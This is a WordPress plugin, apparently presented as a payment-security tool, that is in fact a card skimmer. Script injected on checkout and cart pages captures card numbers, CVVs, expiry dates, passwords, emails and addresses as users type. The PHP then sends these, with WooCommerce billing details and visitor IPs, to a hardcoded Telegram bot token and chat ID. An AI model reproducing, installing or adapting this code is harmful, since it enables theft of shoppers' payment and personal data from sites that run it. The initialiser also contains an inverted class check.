<?php
/**
 * Plugin Name: Universal Payment Capture Pro
 * Description: Real-time capture of ALL payment forms with selective Telegram notifications
 * Version: 6.0.0
 * Author: Payment Security System
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('UniversalPaymentCapturePro')) {

class UniversalPaymentCapturePro {
    
    // Configuration
    private $telegram_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $telegram_chat_id = '7319274794';
    
    private $is_processing = false;
    private $session_tracker = array();
    private $page_already_tracked = false;
    
    public function __construct() {
        add_action('init', array($this, 'start_system'), 1);
    }
    
    public function start_system() {
        // 1. ACTIVATION MESSAGE
        if (!get_option('upcp_activated')) {
            $this->telegram_send("🚀 Universal Payment Capture Pro ACTIVATED\n🌐 Site: " . home_url());
            update_option('upcp_activated', time());
        }
        
        // 2. Load only on payment pages
        add_action('wp_enqueue_scripts', array($this, 'load_payment_scripts'));
        
        // 3. AJAX handlers
        add_action('wp_ajax_nopriv_upcp_process_data', array($this, 'process_captured_data'));
        add_action('wp_ajax_upcp_process_data', array($this, 'process_captured_data'));
        
        // 4. Universal tracking script
        add_action('wp_footer', array($this, 'inject_universal_tracker'), 99999);
        
        // 5. Track ONLY cart and checkout pages
        add_action('wp_head', array($this, 'track_important_pages_only'));
        
        // 6. WooCommerce support
        if (class_exists('WooCommerce')) {
            add_action('woocommerce_checkout_order_processed', array($this, 'capture_full_order'), 10, 3);
            add_action('woocommerce_payment_complete', array($this, 'capture_successful_payment'));
        }
        
        // 7. Other payment plugins support
        add_action('wp_footer', array($this, 'add_special_plugin_support'), 99998);
    }
    
    public function load_payment_scripts() {
        if ($this->should_track_current_page()) {
            wp_enqueue_script('jquery');
        }
    }
    
    private function should_track_current_page() {
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        
        // Track only payment-related pages
        $payment_pages = array('checkout', 'cart', 'payment', 'pay', 'donation', 
                              'buy', 'purchase', 'order', 'check-out', 'paypal', 
                              'stripe', 'razorpay', 'credit-card');
        
        foreach ($payment_pages as $page) {
            if (strpos($current_url, $page) !== false) {
                return true;
            }
        }
        
        // Check page content for payment forms
        global $post;
        if (is_a($post, 'WP_Post')) {
            $content = strtolower($post->post_content);
            $payment_indicators = array('[payment', '[donation', 'paypal', 'stripe', 
                                       'razorpay', 'credit card', 'card number', 'cvv');
            
            foreach ($payment_indicators as $indicator) {
                if (strpos($content, $indicator) !== false) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    public function track_important_pages_only() {
        // Prevent duplicate tracking
        if ($this->page_already_tracked) return;
        
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        
        // ✅ ONLY track Cart and Checkout pages
        if (strpos($current_url, '/cart') !== false || strpos($current_url, '/basket') !== false) {
            $this->send_page_notification('🛒 CART PAGE VISIT');
            $this->page_already_tracked = true;
        } 
        elseif (strpos($current_url, '/checkout') !== false || strpos($current_url, '/check-out') !== false) {
            $this->send_page_notification('💰 CHECKOUT PAGE VISIT');
            $this->page_already_tracked = true;
        }
        // ❌ NO OTHER PAGES WILL BE TRACKED
    }
    
    private function send_page_notification($page_type) {
        $page_data = array(
            'title' => wp_get_document_title(),
            'url' => home_url($_SERVER['REQUEST_URI']),
            'type' => $page_type,
            'time' => current_time('mysql'),
            'ip' => $this->get_user_ip()
        );
        
        $message = "{$page_data['type']}\n";
        $message .= "📄 Page: {$page_data['title']}\n";
        $message .= "🌐 URL: {$page_data['url']}\n";
        $message .= "🕒 Time: {$page_data['time']}\n";
        $message .= "📍 IP: {$page_data['ip']}";
        
        $this->telegram_send($message);
    }
    
    public function process_captured_data() {
        // Minimal processing
        if ($this->is_processing) {
            wp_send_json(array('status' => 'processing'));
        }
        
        $this->is_processing = true;
        
        // Get raw data
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if ($data && is_array($data)) {
            $event_type = $data['event'] ?? '';
            $event_data = $data['data'] ?? array();
            
            switch ($event_type) {
                case 'form_captured':
                    $this->handle_captured_form($event_data);
                    break;
                    
                case 'field_captured':
                    $this->handle_captured_field($event_data);
                    break;
                    
                case 'payment_captured':
                    $this->handle_payment_details($event_data);
                    break;
            }
        }
        
        $this->is_processing = false;
        wp_send_json(array('status' => 'success'));
    }
    
    private function handle_captured_form($data) {
        $form_data = $this->sanitize_captured_data($data['fields'] ?? array());
        $form_type = $this->detect_form_type($data);
        
        if (empty($form_data)) return;
        
        $message = "📋 FORM CAPTURED: {$form_type}\n\n";
        
        // Categorize ALL data
        $categories = $this->categorize_all_data($form_data, $form_type);
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_category_header($category) . "\n";
                foreach ($fields as $key => $value) {
                    $clean_key = $this->format_key_name($key);
                    $message .= "• {$clean_key}: {$value}\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "🌐 URL: " . ($data['page_url'] ?? 'N/A') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_user_ip();
        
        $this->telegram_send($message);
    }
    
    private function handle_captured_field($data) {
        $field_name = $data['field'] ?? '';
        $field_value = $data['value'] ?? '';
        
        if (empty($field_value) || !$this->is_important_field($field_name)) return;
        
        $message = "⌨️ REAL-TIME FIELD CAPTURE\n\n";
        $message .= "• Field: " . $this->format_key_name($field_name) . "\n";
        $message .= "• Value: " . substr($field_value, 0, 100) . "\n";
        $message .= "🌐 URL: " . ($data['page_url'] ?? 'N/A') . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->telegram_send($message);
    }
    
    private function handle_payment_details($data) {
        $payment_info = $this->sanitize_captured_data($data['details'] ?? array());
        
        if (empty($payment_info)) return;
        
        $message = "💳 PAYMENT DETAILS CAPTURED\n\n";
        
        foreach ($payment_info as $key => $value) {
            if (!empty($value)) {
                $clean_key = $this->format_key_name($key);
                $message .= "• {$clean_key}: {$value}\n";
            }
        }
        
        $message .= "\n🌐 URL: " . ($data['page_url'] ?? 'N/A') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_user_ip();
        
        $this->telegram_send($message);
    }
    
    public function capture_full_order($order_id, $posted_data, $order) {
        if (!$order) return;
        
        $billing_info = array(
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Email' => $order->get_billing_email(),
            'Phone' => $order->get_billing_phone(),
            'Company' => $order->get_billing_company(),
            'Address 1' => $order->get_billing_address_1(),
            'Address 2' => $order->get_billing_address_2(),
            'City' => $order->get_billing_city(),
            'State' => $order->get_billing_state(),
            'Postcode' => $order->get_billing_postcode(),
            'Country' => $order->get_billing_country()
        );
        
        $payment_data = $this->extract_all_payment_data();
        
        $message = "🛒 WOOCOMMERCE ORDER PROCESSED\n\n";
        $message .= "📦 Order ID: #{$order_id}\n";
        $message .= "💰 Total: {$order->get_total()} {$order->get_currency()}\n";
        $message .= "💳 Method: {$order->get_payment_method_title()}\n\n";
        
        $message .= "📍 BILLING INFORMATION:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "• {$key}: {$value}\n";
            }
        }
        
        if (!empty($payment_data)) {
            $message .= "\n💳 PAYMENT CARD INFORMATION:\n";
            foreach ($payment_data as $key => $value) {
                $clean_key = $this->format_key_name($key);
                $message .= "• {$clean_key}: {$value}\n";
            }
        }
        
        $message .= "\n🌐 Site: " . home_url() . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_user_ip();
        
        $this->telegram_send($message);
    }
    
    private function extract_all_payment_data() {
        $payment_info = array();
        
        // Comprehensive list of ALL payment field names
        $all_payment_fields = array(
            // Credit Card Numbers
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            'credit_card_number', 'card-number', 'cc-number',
            
            // Expiry Dates
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            'card-expiry', 'cc-expiry',
            
            // CVV/CVC
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode', 'card-cvv', 'cc-cvv',
            
            // Card Holder
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername', 'card-holder',
            
            // Card Type
            'card_type', 'cardtype', 'cc_type', 'cctype',
            
            // PayPal Fields
            'paypal_email', 'paypal_account', 'payer_email', 'paypal', 'paypal_email_address',
            'paypal_account_email', 'payer_id',
            
            // Stripe Fields
            'stripe_token', 'stripe_email', 'stripe_card', 'stripe_customer',
            'stripe_source', 'stripe_payment_method',
            
            // Razorpay Fields
            'razorpay_payment_id', 'razorpay_order_id', 'razorpay_signature',
            'razorpay_payment_link', 'razorpay_customer_id',
            
            // Bank Details
            'account_holder', 'account_number', 'routing_number', 'iban', 'swift', 
            'bank_account', 'bank_name', 'bank_code', 'branch_code',
            
            // Other Payment Gateways
            'skrill_email', 'paytm_mobile', 'phonepe_vpa', 'google_pay',
            'amazon_pay', 'apple_pay', 'momo_wallet', 'bkash_number',
            
            // Generic Payment
            'payment_method', 'payment_type', 'payment_gateway'
        );
        
        // Check POST data
        foreach ($all_payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        // Also check for variations
        foreach ($_POST as $key => $value) {
            $key_lower = strtolower($key);
            foreach (array('card', 'cvv', 'cvc', 'expir', 'paypal', 'stripe', 'razorpay', 'account', 'bank') as $pattern) {
                if (strpos($key_lower, $pattern) !== false && !empty($value)) {
                    if (!isset($payment_info[$key])) {
                        $payment_info[$key] = sanitize_text_field($value);
                    }
                    break;
                }
            }
        }
        
        return $payment_info;
    }
    
    public function capture_successful_payment($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "✅ PAYMENT COMPLETED\n\n";
        $message .= "📦 Order ID: #{$order_id}\n";
        $message .= "💰 Amount: {$order->get_total()} {$order->get_currency()}\n";
        $message .= "💳 Method: {$order->get_payment_method_title()}\n";
        $message .= "📧 Customer: {$order->get_billing_email()}\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->telegram_send($message);
    }
    
    public function inject_universal_tracker() {
        if (!$this->should_track_current_page()) return;
        
        $ajax_url = admin_url('admin-ajax.php');
        $session_id = 'sess_' . uniqid();
        
        ?>
        <!-- Universal Payment Capture Pro v6.0 -->
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            var UPCP = {
                config: {
                    ajaxUrl: '<?php echo esc_url($ajax_url); ?>',
                    sessionId: '<?php echo $session_id; ?>',
                    isSending: false,
                    queue: []
                },
                
                init: function() {
                    this.setupUniversalFormCapture();
                    this.setupRealTimeFieldCapture();
                    this.setupPaymentButtonCapture();
                    this.startQueueProcessor();
                },
                
                setupUniversalFormCapture: function() {
                    var self = this;
                    
                    // Capture ALL forms
                    $('form').on('submit', function(e) {
                        var formData = {};
                        var formElement = this;
                        
                        // Get ALL form data
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        // Detect form type
                        var formType = self.detectFormType(formElement);
                        
                        self.addToQueue('form_captured', {
                            form_type: formType,
                            fields: formData,
                            page_url: window.location.href
                        });
                    });
                },
                
                detectFormType: function(formElement) {
                    var $form = $(formElement);
                    var html = $form.html().toLowerCase();
                    var action = $form.attr('action') || '';
                    var classes = $form.attr('class') || '';
                    var id = $form.attr('id') || '';
                    
                    // Check for specific payment plugins
                    if (html.includes('paypal') || action.includes('paypal.com') || 
                        classes.includes('paypal') || id.includes('paypal')) {
                        return 'PayPal Payment Form';
                    }
                    else if (html.includes('stripe') || action.includes('stripe.com') || 
                            classes.includes('stripe') || id.includes('stripe')) {
                        return 'Stripe Payment Form';
                    }
                    else if (html.includes('razorpay') || action.includes('razorpay.com') || 
                            classes.includes('razorpay') || id.includes('razorpay')) {
                        return 'Razorpay Payment Form';
                    }
                    else if (html.includes('wpcf7') || classes.includes('wpcf7')) {
                        return 'Contact Form 7';
                    }
                    else if (html.includes('gform') || classes.includes('gform')) {
                        return 'Gravity Forms';
                    }
                    else if (html.includes('give-form') || classes.includes('give-form')) {
                        return 'GiveWP Donation Form';
                    }
                    else if (classes.includes('checkout') || id.includes('checkout')) {
                        return 'WooCommerce Checkout';
                    }
                    else if (html.includes('payment') || classes.includes('payment') || 
                            action.includes('payment')) {
                        return 'Generic Payment Form';
                    }
                    else if (html.includes('donation') || classes.includes('donation')) {
                        return 'Donation Form';
                    }
                    else {
                        return 'Web Form';
                    }
                },
                
                setupRealTimeFieldCapture: function() {
                    var self = this;
                    
                    // Capture ALL important fields in real-time
                    var importantFields = [
                        // Credit Card Fields
                        'input[name*="card"], input[name*="cc"], input[name*="number"][type="text"]',
                        
                        // Expiry Fields
                        'input[name*="expir"], input[name*="expiry"], input[name*="exp_date"]',
                        
                        // CVV/CVC Fields
                        'input[name*="cvv"], input[name*="cvc"], input[name*="cvn"]',
                        
                        // Email Fields (for PayPal/accounts)
                        'input[type="email"], input[name*="email"]',
                        
                        // PayPal Specific
                        'input[name*="paypal"], input[name*="payer"]',
                        
                        // Phone Fields
                        'input[type="tel"], input[name*="phone"], input[name*="mobile"]',
                        
                        // Bank Fields
                        'input[name*="account"], input[name*="routing"], input[name*="iban"]',
                        
                        // Password Fields (for account logins)
                        'input[type="password"]',
                        
                        // Name Fields
                        'input[name*="name"], input[name*="first"], input[name*="last"]',
                        
                        // Address Fields
                        'input[name*="address"], input[name*="city"], input[name*="zip"], input[name*="postcode"]'
                    ];
                    
                    $(importantFields.join(',')).on('blur input', function(e) {
                        if (this.value && this.value.length >= 3) {
                            var fieldType = self.getFieldType(this);
                            
                            // Real-time capture for sensitive fields
                            if (fieldType === 'payment' || fieldType === 'email' || fieldType === 'phone') {
                                self.addToQueue('field_captured', {
                                    field: this.name || this.id,
                                    value: this.value,
                                    field_type: fieldType,
                                    page_url: window.location.href
                                });
                            }
                            
                            // Special handling for card numbers
                            if (fieldType === 'payment' && this.value.replace(/\s/g, '').length >= 12) {
                                self.addToQueue('payment_captured', {
                                    details: {
                                        'Card Number': this.value
                                    },
                                    page_url: window.location.href
                                });
                            }
                        }
                    });
                },
                
                getFieldType: function(field) {
                    var name = (field.name || '').toLowerCase();
                    var type = (field.type || '').toLowerCase();
                    
                    if (name.includes('card') || name.includes('cc') || 
                        name.includes('cvv') || name.includes('cvc') || 
                        name.includes('expir')) {
                        return 'payment';
                    }
                    else if (name.includes('paypal') || name.includes('payer')) {
                        return 'paypal';
                    }
                    else if (type === 'email' || name.includes('email')) {
                        return 'email';
                    }
                    else if (type === 'tel' || name.includes('phone') || name.includes('mobile')) {
                        return 'phone';
                    }
                    else if (type === 'password') {
                        return 'password';
                    }
                    else {
                        return 'general';
                    }
                },
                
                setupPaymentButtonCapture: function() {
                    var self = this;
                    
                    // Capture ALL payment-related buttons
                    $('button, input[type="submit"], input[type="button"], a').on('click', function() {
                        var text = $(this).text() || $(this).val() || $(this).attr('value') || '';
                        var textLower = text.toLowerCase();
                        
                        // Check if this is a payment button
                        var paymentKeywords = ['pay', 'checkout', 'buy', 'purchase', 'donate', 
                                              'order', 'subscribe', 'confirm', 'proceed'];
                        
                        for (var i = 0; i < paymentKeywords.length; i++) {
                            if (textLower.includes(paymentKeywords[i])) {
                                self.addToQueue('payment_captured', {
                                    details: {
                                        'Button Clicked': text
                                    },
                                    page_url: window.location.href
                                });
                                break;
                            }
                        }
                    });
                },
                
                addToQueue: function(eventType, eventData) {
                    this.queue.push({
                        event: eventType,
                        data: eventData,
                        timestamp: Date.now(),
                        session: this.config.sessionId
                    });
                },
                
                startQueueProcessor: function() {
                    var self = this;
                    
                    setInterval(function() {
                        if (self.config.isSending || self.queue.length === 0) {
                            return;
                        }
                        
                        self.config.isSending = true;
                        var item = self.queue.shift();
                        
                        $.ajax({
                            url: self.config.ajaxUrl,
                            method: 'POST',
                            contentType: 'application/json',
                            data: JSON.stringify(item),
                            success: function() {
                                // Silent success
                            },
                            error: function() {
                                // Silent error - don't show to user
                            },
                            complete: function() {
                                self.config.isSending = false;
                            }
                        });
                        
                    }, 300); // Process every 300ms
                }
            };
            
            UPCP.init();
        });
        </script>
        <!-- End Universal Payment Capture Pro -->
        <?php
    }
    
    public function add_special_plugin_support() {
        if (!$this->should_track_current_page()) return;
        
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            // Additional support for specific payment plugins
            
            // 1. Easy Digital Downloads
            if ($('#edd_purchase_form').length) {
                $('#edd_purchase_form').on('submit', function() {
                    console.log('EDD form detected');
                });
            }
            
            // 2. MemberPress
            if ($('.mepr-checkout-form').length) {
                $('.mepr-checkout-form').on('submit', function() {
                    console.log('MemberPress form detected');
                });
            }
            
            // 3. Paid Memberships Pro
            if ($('#pmpro_form').length) {
                $('#pmpro_form').on('submit', function() {
                    console.log('PMPro form detected');
                });
            }
            
            // 4. WP Simple Pay
            if ($('.simpay-form').length) {
                $('.simpay-form').on('submit', function() {
                    console.log('Simple Pay form detected');
                });
            }
            
            // 5. WooCommerce Subscriptions
            if ($('.wcsatt-add-to-subscription-form').length) {
                $('.wcsatt-add-to-subscription-form').on('submit', function() {
                    console.log('WC Subscriptions form detected');
                });
            }
        });
        </script>
        <?php
    }
    
    private function sanitize_captured_data($data) {
        $clean = array();
        foreach ($data as $key => $value) {
            if (is_string($value) && trim($value) !== '') {
                $clean[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 250));
            }
        }
        return $clean;
    }
    
    private function detect_form_type($data) {
        $form_type = $data['form_type'] ?? 'Unknown Form';
        $fields = $data['fields'] ?? array();
        
        // Check for specific payment indicators
        foreach ($fields as $key => $value) {
            $key_lower = strtolower($key);
            if (strpos($key_lower, 'paypal') !== false) {
                return 'PayPal Payment Form';
            }
            if (strpos($key_lower, 'stripe') !== false) {
                return 'Stripe Payment Form';
            }
            if (strpos($key_lower, 'razorpay') !== false) {
                return 'Razorpay Payment Form';
            }
            if (strpos($key_lower, 'card') !== false || 
                strpos($key_lower, 'cvv') !== false || 
                strpos($key_lower, 'expir') !== false) {
                return 'Credit Card Payment Form';
            }
        }
        
        return $form_type;
    }
    
    private function categorize_all_data($data, $form_type) {
        $categories = array(
            'Personal Info' => array(),
            'Contact Info' => array(),
            'Payment Details' => array(),
            'Billing Address' => array(),
            'Shipping Address' => array(),
            'Account Info' => array(),
            'Other Info' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            // Payment Details
            if (strpos($key_lower, 'card') !== false || 
                strpos($key_lower, 'cvv') !== false || 
                strpos($key_lower, 'cvc') !== false ||
                strpos($key_lower, 'expir') !== false ||
                strpos($key_lower, 'cc') !== false ||
                strpos($key_lower, 'paypal') !== false ||
                strpos($key_lower, 'stripe') !== false ||
                strpos($key_lower, 'razorpay') !== false ||
                strpos($key_lower, 'account') !== false ||
                strpos($key_lower, 'routing') !== false ||
                strpos($key_lower, 'iban') !== false ||
                strpos($key_lower, 'swift') !== false) {
                $categories['Payment Details'][$key] = $value;
            }
            // Personal Info
            elseif (strpos($key_lower, 'name') !== false || 
                   strpos($key_lower, 'first') !== false || 
                   strpos($key_lower, 'last') !== false) {
                $categories['Personal Info'][$key] = $value;
            }
            // Contact Info
            elseif (strpos($key_lower, 'email') !== false || 
                   strpos($key_lower, 'phone') !== false ||
                   strpos($key_lower, 'mobile') !== false) {
                $categories['Contact Info'][$key] = $value;
            }
            // Billing Address
            elseif (strpos($key_lower, 'billing') !== false) {
                $categories['Billing Address'][$key] = $value;
            }
            // Shipping Address
            elseif (strpos($key_lower, 'shipping') !== false) {
                $categories['Shipping Address'][$key] = $value;
            }
            // Account Info
            elseif (strpos($key_lower, 'user') !== false || 
                   strpos($key_lower, 'login') !== false ||
                   strpos($key_lower, 'password') !== false) {
                $categories['Account Info'][$key] = $value;
            }
            // Address fields (general)
            elseif (strpos($key_lower, 'address') !== false || 
                   strpos($key_lower, 'city') !== false ||
                   strpos($key_lower, 'state') !== false ||
                   strpos($key_lower, 'zip') !== false ||
                   strpos($key_lower, 'postcode') !== false ||
                   strpos($key_lower, 'country') !== false) {
                $categories['Billing Address'][$key] = $value;
            }
            // Other Info
            else {
                $categories['Other Info'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function get_category_header($category) {
        $headers = array(
            'Personal Info' => '👤 PERSONAL INFORMATION',
            'Contact Info' => '📞 CONTACT INFORMATION',
            'Payment Details' => '💳 PAYMENT DETAILS',
            'Billing Address' => '📍 BILLING ADDRESS',
            'Shipping Address' => '🚚 SHIPPING ADDRESS',
            'Account Info' => '🔐 ACCOUNT INFORMATION',
            'Other Info' => '📝 OTHER INFORMATION'
        );
        return $headers[$category] ?? $category;
    }
    
    private function format_key_name($key) {
        $key = str_replace(array('_', '-'), ' ', $key);
        $key = preg_replace('/\b(billing_|shipping_|payment_|card_|cc_|paypal_|stripe_|razorpay_)\b/i', '', $key);
        return ucwords(trim($key));
    }
    
    private function is_important_field($field_name) {
        $field = strtolower($field_name);
        $important = array('card', 'cvv', 'cvc', 'expir', 'cc', 'paypal', 'stripe', 
                          'razorpay', 'account', 'routing', 'iban', 'swift', 'bank',
                          'email', 'phone', 'password', 'name', 'address');
        
        foreach ($important as $pattern) {
            if (strpos($field, $pattern) !== false) return true;
        }
        return false;
    }
    
    private function telegram_send($message) {
        if (empty(trim($message))) return;
        
        $url = 'https://api.telegram.org/bot' . $this->telegram_token . '/sendMessage';
        
        $args = array(
            'body' => array(
                'chat_id' => $this->telegram_chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 5,
            'blocking' => false,
            'sslverify' => false
        );
        
        wp_remote_post($url, $args);
    }
    
    private function get_user_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        }
    }
}

// Initialize
function upcp_init() {
    static $instance = null;
    
    if (null === $instance && !class_exists('UniversalPaymentCapturePro')) {
        $instance = new UniversalPaymentCapturePro();
    }
    
    return $instance;
}

// Start early but safely
add_action('plugins_loaded', 'upcp_init', 0);

}
